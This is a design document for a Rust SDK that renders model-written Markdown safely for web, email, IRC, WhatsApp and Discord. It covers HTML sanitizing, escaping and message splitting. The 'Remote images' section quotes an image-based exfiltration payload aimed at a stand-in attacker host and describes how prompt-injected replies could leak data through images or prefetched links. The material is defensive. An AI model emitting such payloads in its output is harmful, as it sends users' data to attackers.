# Rendering Model Output

The model writes Markdown, and every channel receives it as CommonMark ([Plan](../PLAN.md) §6.9).
Each channel turns it into its own format. The renderers live in `giles_plugin_sdk::render`, so the
built-in web channel and the Rust channel plugins share one implementation (§10). They are built on
`pulldown-cmark`.

| Function                        | Used by                | Output                                    |
| ------------------------------- | ---------------------- | ----------------------------------------- |
| `html(markdown, allow_image)`   | Web, email (HTML part) | Sanitized HTML fragment                   |
| `is_local_image(url)`           | Web (as `allow_image`) | Whether an image URL loads nothing remote |
| `plain_text(markdown)`          | Email (text part)      | Readable plain text                       |
| `irc(markdown, max_line_bytes)` | IRC                    | Message lines with IRC formatting codes   |
| `whatsapp(markdown)`            | WhatsApp               | WhatsApp markup                           |
| `discord(markdown, max_chars)`  | Discord                | Messages in Discord's Markdown            |

## Shared Rules

All renderers parse with the same options, so a message means the same thing on every channel:

- Extensions: tables, strikethrough, and task lists, because models use them constantly and every
  output format has a reasonable rendering for them.
- Left out: footnotes, heading attributes (`{#id .class}`), math, smart punctuation, and GitHub
  alert blockquotes. Heading attributes and footnotes would let the model set element ids and
  classes in the page; the rest change text or add little.
- Bare URLs are not turned into links: `pulldown-cmark` doesn't support GitHub's extended autolinks.
  CommonMark autolinks (`<https://example.com>`, `<me@example.com>`) are links.
- Raw HTML in the input is never interpreted. Each renderer shows it as literal text.
- Control characters other than tab and newline (C0, DEL, and C1) are dropped from all text. They
  are invisible in HTML, can drive a terminal reading plain-text mail, and are IRC formatting
  commands.

## HTML

`html` renders for the web channel and the HTML part of email. The result must be safe to inline
into a page that holds the user's session, so the renderer emits only markup it builds itself:

- Raw HTML blocks and inline HTML become escaped text (an HTML block becomes a paragraph).
- Links keep their target only when it starts with `http://`, `https://`, or `mailto:`
  (case-insensitive prefix match, so `java%0ascript:` or a relative URL can't slip through a scheme
  parser). Every kept link gets `rel="noopener noreferrer nofollow"`. A refused link renders as its
  text.
- Images render only when the caller's `allow_image(url)` predicate accepts the URL; otherwise the
  alt text is shown as plain text. The web channel passes `is_local_image`.
- Heading ids, classes, and attributes are cleared, blockquote alert classes are dropped, and a code
  block's language (emitted as `class="language-..."`) is reduced to its first word and the
  characters `[A-Za-z0-9+-_.#]`.
- URLs are escaped with `pulldown-cmark`'s `escape_href` and text and attributes with `escape_html`,
  so quotes in a URL or title can't end the attribute.

### Remote images

Showing an image loads it. A prompt-injected reply like `![](https://attacker/?d=...)` would send
data to the attacker the moment the page renders, with no tool call and no click (§9). So the
renderer drops every image the predicate refuses, the URL included, and the web pages also send
`Content-Security-Policy: img-src 'self' data:` as a second layer.

`is_local_image` accepts exactly:

- a blob-store image served by the web channel: `/blobs/<id>`, where `<id>` is the blob's SHA-256 as
  64 lowercase hex digits. Nothing may follow the id, so there is no path traversal and no
  protocol-relative `//host` form;
- a `data:` URL whose media type is `image/png`, `image/jpeg`, `image/gif`, `image/webp`, or
  `image/avif`. SVG is refused as defense in depth, although an SVG in an `<img>` can't run script
  or load anything.

The predicate is a parameter because a blob-store path means nothing in an email: the email channel
can accept `cid:` URLs of inline attachments instead.

### Why not `ammonia`

Sanitizing after rendering (with `ammonia`) parses the HTML a second time with `html5ever` and pulls
in a large dependency tree for a published SDK crate. Filtering the event stream is simpler to
reason about: the input can never produce a tag, since raw HTML only ever becomes text, and the only
tags in the output are the fixed set `pulldown-cmark` writes for CommonMark constructs plus the
`<a>` and `<img>` tags the renderer builds and escapes itself. The tests cover the attack cases:
script and image tags, `javascript:` in every spelling, attribute breakout through URLs and titles,
remote, protocol-relative, reference-style, and linked images.

## Text Layout

The text renderers share one layout:

- Blocks (paragraphs, headings, code blocks, lists, quotes, tables) are separated by a blank line
  (on IRC, just a line break). Soft line breaks stay line breaks: in chat and plain-text mail, a
  line break the model wrote is more often meant than not.
- Lists use `-` and `1.` markers followed by a space (an ordered list keeps its start number); an
  item's later lines are indented by the marker's width. Items of a loose list are separated by
  blank lines. Task list items start with `[ ]` or `[x]`.
- Quotes prefix every line with `>` and a space.
- Links show their target after the text, as `text <url>` (RFC 3986, appendix C); autolinks show the
  URL once. Text formats are inert, so the target is shown whatever its scheme.
- Images show only their alt text, as `[image: alt]`, never the URL. An image is the classic
  injection-exfiltration vector, and nothing is lost by dropping its URL from a text format. This is
  defense in depth, not a guarantee: link targets are still printed, and some chat clients (such as
  The Lounge on IRC) prefetch any URL they see, so a prompt-injected link can still leak data to a
  client that does.
- Raw HTML is shown as text. Thematic breaks are `---`.

## Plain Text

`plain_text` renders the text part of email:

- Level 1 headings are underlined with `=`, other levels with `-`.
- `*strong*`, `_emphasis_`, `~~strikethrough~~`, and `` `code` `` keep a light, widely read markup.
- Code blocks keep their text verbatim, indented by four spaces.
- Tables are aligned columns separated by ` | `, with a `-` rule under the header row. Widths count
  characters, so wide (CJK, emoji) and combining characters misalign columns slightly.

## IRC

`irc(markdown, max_line_bytes)` returns the lines to send, one `PRIVMSG` each:

- Strong text and headings are bold (`\x02`), emphasis is italic (`\x1d`). Both are toggles, and a
  style nested in itself (bold inside a heading) writes no second toggle, which would end it.
  Strikethrough stays `~~text~~` and inline code `` `code` ``: the strikethrough (`\x1e`) and
  monospace (`\x11`) codes are not widely supported.
- Code blocks are plain lines, indentation kept, with no formatting inside.
- There are no blank lines between blocks, and empty lines are dropped: IRC can't send an empty
  message.
- Every control character in the input is dropped, including the formatting codes (`\x02`, `\x03`
  colors, `\x0f`, `\x16`, `\x1d`, ...) and CTCP's `\x01`, so the model can't color text or send a
  CTCP request (`\x01ACTION`). The renderer's own codes are the only ones in the output.

### Line splitting

An IRC line is at most 512 bytes, including the source prefix the server adds when relaying, the
command and target, and the CRLF. The caller knows its target and nick, so `max_line_bytes` is a
parameter: the bytes left for the text of one message.

```text
max_line_bytes = 512 - 2 - len("PRIVMSG <target> :") - len(":<nick>!<user>@<host> ")
```

The relayed `<user>@<host>` is what other clients see, which may be a cloak and isn't always known
to the plugin. When it isn't, assume a long host (63 bytes, the usual server `HOSTLEN`), so a
message is split a little early rather than truncated by the server.

- A line longer than the limit is split at the last space that fits, or at the last UTF-8 character
  boundary that fits when there is no space. The space at a split is dropped, along with any
  formatting codes next to it (they only change what the next line reopens); a line's leading
  indentation is kept. Splits are not grapheme-aware, so a combining sequence or an emoji with
  modifiers can be cut between its code points.
- IRC clients reset formatting at the end of each message, so a line that starts inside a bold or
  italic span begins with the codes that reopen it. `\x0f` (reset) is never emitted: closing a style
  toggles its own code, and the end of the message resets the rest.
- Every line fits the limit, reopening codes included, unless the limit is below 4 bytes and a
  single character can't fit; then that character is sent alone. When the reopening codes and the
  next character don't fit together, the codes are left out.

## WhatsApp

`whatsapp(markdown)` renders WhatsApp's markup:

- Strong text and headings are `*bold*`, emphasis `_italic_`, strikethrough `~struck~`, inline code
  `` `code` ``, and code blocks are fenced with three backticks on lines of their own. WhatsApp
  shows text inside the fences literally.
- Lists and quotes use the `-`, `1.`, and `>` syntax WhatsApp renders since 2023. WhatsApp has no
  nested lists: a nested item shows as an indented line. Tables are rows with `|` between cells.
- WhatsApp styles don't span lines, so open styles are closed before each line break and reopened
  after it.

WhatsApp has no escape character, so text that only looks like markup must not contain the
characters that form it. In prose, `*`, `_`, `~`, and `` ` `` are replaced with look-alikes: `∗`
(U+2217), `ˍ` (U+02CD), `∼` (U+223C), and `ˋ` (U+02CB). Two exceptions keep common text intact:

- `*`, `_`, and `~` between two letters or digits stay (`snake_case`), since WhatsApp only applies a
  style at word boundaries.
- A word containing `://` or starting with `www.` stays, so bare URLs still work as links. Link
  targets and autolinks are written as they are, for the same reason.

The block markers WhatsApp recognizes at the start of a line get the same treatment when they come
from text rather than from the renderer's own lists and quotes: a leading `>` becomes `˃` (U+02C3),
a leading `-` and space becomes `‐` (U+2010), and the dot of a leading number and dot (`1.`) becomes
`․` (U+2024). This covers escaped markers (`1\. not a list`), lines after a soft break, and table
rows; code blocks are left as they are.

Inline code containing a backtick, which WhatsApp's inline code can't hold, is shown as escaped
text; a triple backtick inside a code block, which would end it, becomes `ˋˋˋ`.

Limits:

- WhatsApp's formatting rules are not fully published. The rules above follow its help pages and
  third-party descriptions of its behavior; no WhatsApp client was used to test them. Copying text
  with a look-alike yields the look-alike, not the original character.
- A style that touches a letter on the outside, such as CommonMark's intraword `a*b*c` (written as
  `a_b_c`), is probably shown with its markers rather than styled.
- `pulldown-cmark` has no bare-URL detection, so markup inside a bare URL (`https://x/*a*`) is
  parsed as emphasis before any renderer sees it. The same holds for every format.

## Discord

`discord(markdown, max_chars)` returns the messages to send, each at most `max_chars` characters;
`DISCORD_MAX_CHARS` (2000) is Discord's limit. It writes Discord's flavor of Markdown, which most of
CommonMark already is, so the renderer mostly normalizes and escapes. What Discord renders comes
from its help article "Markdown Text 101" and the developer documentation ("Message Formatting",
"Create Message"); no Discord client was used to test the output.

- Strong text is `**bold**`, emphasis `*italic*` (`*` works at any position; `_` is reportedly not
  read inside a word, though the article shows both), strikethrough `~~struck~~`, inline code
  `` `code` ``. Underline (`__x__`) and spoilers (`||x||`) have no CommonMark form, so `__x__` is
  strong, as CommonMark says, and the model's `||` is escaped.
- Headings are `#`, `##`, and `###`, the three levels Discord has; levels 4 to 6 are `###`. A
  heading is one line, so a line break inside it is a space.
- Lists use `-` and `1.` (an ordered list keeps its start number), nested by indenting the marker's
  width (the article shows two spaces for `-`). Quotes prefix every line with `> `, empty lines too,
  since the article says Discord wants a space after the `>` (not tried in a client). Discord has no
  syntax for tables, images, or HTML.
- Styles close before each line break and reopen after it, as in WhatsApp, so a message that ends at
  a line break never holds an open style.
- Control characters other than tab and newline are dropped, as in every renderer.

### Escaping

Text the model wrote as plain text must stay plain, so `\`, `*`, `~`, `` ` ``, `[`, and `]` get a
backslash, which Discord removes when it renders. Three exceptions keep text readable: `_` inside a
word (`snake_case`: Discord needs a word boundary there), `|` unless next to another `|`, and `<`
before a space (`2 < 3`). Block markers only matter at the start of a line, so a leading `#`, `>`,
`-` or `+` followed by a space, `-#`, and the dot of `1.` are escaped there and nowhere else. A
digit can't be escaped, which is why the dot is. Raw HTML is shown as text, one escaped line at a
time, so a line inside an HTML block can't become a heading or a list.

### Mentions

Discord reads mentions out of the message content: `@everyone`, `@here`, `<@id>`, `<@!id>`,
`<@&id>`, `<#id>`, and the other `<...>` forms (slash commands, custom emoji, timestamps, guild
navigation). A mention in model output must not ping, and the documentation doesn't say that a
backslash stops the scan, so the renderer breaks each form with a zero-width space (U+200B): it
changes nothing about how the text reads, and `discord.js` breaks code fences the same way
(`cleanCodeBlockContent`). The backslash is added for the client's sake:

- `@` is followed by a zero-width space where `everyone` or `here` follows (any case), or where the
  text ends inside either word or before it starts.
- `<` is followed by one where a `<...>` form follows (`@`, `#`, `:`, `$`, `</name:id>`, or a name
  and a colon), or where the text ends inside one.
- The text can end there because the renderer writes text in pieces: an empty link, an entity, or a
  style marker that a table cell drops can sit between `@` and `everyone`, or between `<` and `@1>`,
  and the pieces join in the output (`@[]()everyone`, or a `<` and a code span holding `#1>` in a
  table cell). Each piece is escaped as if more text could follow it.
- Code is no exception: the same zero-width spaces go into code spans, code blocks, and table cells,
  where a backslash would show. A link target gets `%40` for `@everyone` and `@here`.

The text stays readable, and copying it keeps the invisible character. `allowed_mentions` is the
second line of defense, and belongs to the plugin: it must send it with nothing to parse, so the API
ignores whatever mention gets through
([Message Resource](https://docs.discord.com/developers/resources/message#allowed-mentions-object)).

### Links and images

A bare URL in Discord is fetched for an embed. Discord documents `<url>` as the way to suppress that
("How do I disable auto-embed?"), and `<url>` stays clickable, so:

- A link is a masked link, `[text](<url>)`. The angle brackets inside the parentheses suppress the
  embed too; that form is common in the community (`discord.js` documents `<>` for bare URLs only)
  but not in Discord's own documentation. The plugin can set the documented `SUPPRESS_EMBEDS`
  message flag as a second layer. The target is percent-encoded where it would end the link early
  (whitespace, `<`, `>`, `(`, `)`, `\`, `` ` ``).
- A link with no text, an autolink (`<https://...>`), and a bare `http(s)` URL in prose are `<url>`.
  Trailing punctuation (`.`, `,`, an unbalanced `)`) stays outside it.
- Discord links only `http` and `https`. For any other target the text is followed by the target in
  parentheses, as inline code. An email autolink is its address.
- An image is a link, `[alt](<url>)` (`[image](<url>)` without alt text), never an embed: like every
  renderer, it fetches nothing until someone clicks (§9). An image whose target isn't `http(s)`
  shows `[image: alt]`; an image inside a link shows its alt text, because link text can't hold a
  link.

A link or URL inside a table cell is `text <url>` in code, where it is inert.

### Tables

A table is a code block of aligned columns, the same layout as the plain-text renderer's: cells
joined by ` | `, a `-` rule under the header, alignment honored. Code blocks are monospaced, so
padding works here, unlike on IRC. Cells are plain text: markup and escapes would show as written.
Widths count characters, so wide (CJK, emoji) characters misalign the columns slightly.

### Code blocks

A fenced block keeps its language, reduced to the first word and the characters Discord accepts in a
tag (`[A-Za-z0-9+-_.#]`, the same set the HTML renderer keeps). Discord has no longer fences, so a
run of backticks in code (which would end a span or a fence) is broken with zero-width spaces. An
empty block holds one zero-width space, so that it isn't two bare fences, which Discord may show as
text.

### Splitting

Discord rejects content over 2000 characters, and the documentation doesn't say what a character is.
The question was settled in the API docs repository (`discord-api-docs#1173`): the API counts
Unicode code points; only the official client's input box, which uses JavaScript string length,
counts UTF-16 units. So the limit counts `char`s, and an emoji outside the Basic Multilingual Plane
counts once. A cut can fall between the code points of a joined emoji or a combining sequence.

`max_chars` is a parameter, with Discord's value as the constant. A message ends at:

1. a paragraph break (a blank line outside a code fence), else
2. a line break, else
3. a space, else
4. anywhere.

Each takes the latest place that fits, and the break itself is dropped. The splitter reads the
renderer's own output, so it knows what is open at the cut: a code fence, `**`, `*`, and `~~`
styles, and a code span. Whatever is open is closed at the end of the message and reopened at the
start of the next, and both count toward the limit:

- A fence closes with `` ``` `` on a line of its own and reopens with its language tag. A fence is
  never closed with nothing in it, and a message never ends just before a fence's closing line.
  Quote and list prefixes carry over: inside a quote, the closing and reopening lines carry the `>`
  prefix too.
- A line cut in the middle (at a space or anywhere) starts the next message with the quote prefix,
  so a quoted line stays quoted.
- A space is never a cut inside a code span or a link's text, nor a cut inside an escape (`\*`), a
  marker (`**`), or a `<url>`, so those stay whole when they fit.
- A quote's empty line is a paragraph break: the message ends before it and the next one starts
  after it, so none ends in a dangling `>`.
- A space is not a cut where the text after it starts a bullet, quote, heading, subtext, or numbered
  item (a dash, `+`, `>`, `#`, or `-#` and a space, or `1.` and a space), and neither is any other
  cut that would start a message that way: the next message would show a list, quote, or heading
  that the text didn't have.
- Messages are never empty: whitespace-only input gives none.

Limits:

- A single token longer than `max_chars` is cut at the limit. A link or URL longer than the limit is
  cut with its markup as it is, and so is text when `max_chars` leaves no room beyond the closing
  and reopening text (a fence needs its prefix and four characters to close, styles up to five).
- A code span's text is cut at the limit if it's longer than it, and then closed and reopened.
- A space dropped at a cut inside a code fence changes the code by one space; the text of a code
  block is otherwise unchanged by a split.
